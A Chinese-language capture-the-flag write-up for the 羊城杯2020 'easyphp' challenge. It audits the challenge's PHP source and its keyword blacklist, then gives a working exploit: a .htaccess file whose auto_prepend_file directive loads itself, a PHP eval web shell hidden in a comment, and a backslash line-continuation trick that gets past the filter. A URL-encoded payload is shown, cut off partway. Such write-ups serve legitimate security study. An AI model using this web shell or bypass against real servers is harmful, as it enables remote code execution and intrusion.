# \[羊城杯2020]easyphp

## \[羊城杯2020]easyphp

## 考点

* .htaccess修改PHP配置
* 和[\[XNUCA2019Qualifier\]EasyPHP](xnuca2019qualifier-easyphp.md)一样，直接看它就行了

## wp

给了源码，审计

删除当前目录下除index.php外的所有文件，然后GET获取 `cotent` 和 `filename`

```php
$files = scandir('./'); 
foreach($files as $file) {
	if(is_file($file)){
		if ($file !== "index.php") {
			unlink($file);
		}
	}
} 
$content = $_GET['content'];
$filename = $_GET['filename'];
```

`cotent` 中不能有 `on html type flag upload file`，`filename` 中只能有字母和 `.`

```php
if(stristr($content,'on') || stristr($content,'html') || stristr($content,'type') || stristr($content,'flag') || stristr($content,'upload') || stristr($content,'file')) {
    echo "Hacker";
    die();
}
$filename = $_GET['filename'];
if(preg_match("/[^a-z\.]/", $filename) == 1) {
    echo "Hacker";
    die();
} 
```

使用`.htaccess`，在`.htaccess`中可以设置php.ini的一些参数



在`.htaccess` 中使用`#` 进行单行注释，由于在代码中使用`.` 对content进行拼接，如果content最后加上`\` 就会把拼接的 给注释掉。再配合`#` 就可以注释掉拼接内容了。

接着是利用.htaccess写shell，将一句话写入到.htaccess的注释中，再利用它自动加载文件的特性加载.htaccess文件，从而加载一句话

content为

```
php_value auto_prepend_file ".htaccess"
# <?php eval($_GET[1]);?>\
```

由于file被过滤，可以使用`\` 绕过，就像Linux命令行那样，而换行可以使用`%0A` ，或者直接把下面这段进行URL编码

```
php_value auto_prepend_fi\
le ".htaccess"
# <?php eval($_GET['1']);?>\
```

payload

```
filename=.htaccess&content=php_value+auto_prepend_fi%5c%0ale+%22.htaccess%22%0a%23+%3c%
```

## 小结

1. 和[\[XNUCA2019Qualifier\]EasyPHP](xnuca2019qualifier-easyphp.md)一样，直接看它就行了
